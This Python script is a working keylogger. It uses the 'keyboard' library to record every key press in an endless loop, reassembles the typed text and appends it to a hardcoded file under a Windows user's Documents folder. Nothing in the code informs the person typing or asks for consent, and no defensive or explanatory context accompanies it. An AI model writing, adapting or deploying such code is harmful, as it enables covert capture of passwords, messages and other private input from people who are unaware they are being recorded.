import keyboard

# Create an empty list to store recorded keystrokes
LISTE_LETTERS = []

def main():
    # Continuously run the script
    while True:
        # Record keystrokes until the user presses "Enter"
        while True:
            ma = 'Enter'
            recorded = keyboard.record(until=ma)
            break
        
        # Iterate through the recorded keystrokes
        for key in recorded:
            # Only append keystrokes that were "down" events (i.e. pressed)
            if key.event_type == 'down':
                LISTE_LETTERS.append(key.name)
                
        # Create a string to store the keystrokes as a sentence
        words = "\n"
        for x in LISTE_LETTERS:
            # Replace certain key names with their corresponding characters
            if (x == "space"):
                x = " "
            elif (x == "enter"):
                x = ""
            elif (x == "backspace"):
                words = words[:-1]
                x = ""
            elif (x == "maj"):
                x=""
            words += x

        # Write the keystrokes to a file
        with open("C:\\Users\\noriL\\Documents\\SCRIPT_COMPUTER\\file.txt", "a") as f:
            f.write(str(words))
            f.close()

        # Clear the list of recorded keystrokes for the next iteration
        LISTE_LETTERS.clear()
        

if __name__ == "__main__":
    main()
